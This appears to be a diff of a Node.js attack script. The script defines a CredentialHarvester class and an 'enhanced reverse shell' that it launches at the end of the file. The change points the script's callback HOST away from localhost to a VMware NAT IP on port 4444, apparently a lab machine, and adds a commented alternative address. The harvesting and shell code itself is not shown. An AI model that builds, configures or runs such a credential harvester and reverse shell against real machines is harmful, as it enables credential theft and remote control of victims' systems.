@@ -5,7 +5,7 @@ const fs = require('fs');
 const path = require('path');
 
 // Configuration
-const HOST = 'localhost';  // Connect to local server
+const HOST = '192.168.217.1';  // Your Windows VMware NAT IP
 const PORT = 4444;
 
 class CredentialHarvester {
@@ -257,3 +257,5 @@ function createEnhancedReverseShell() {
 
 // Start the enhanced reverse shell
 createEnhancedReverseShell();
+
+//const HOST = '192.168.1.100'; // Replace with your actual Windows IP
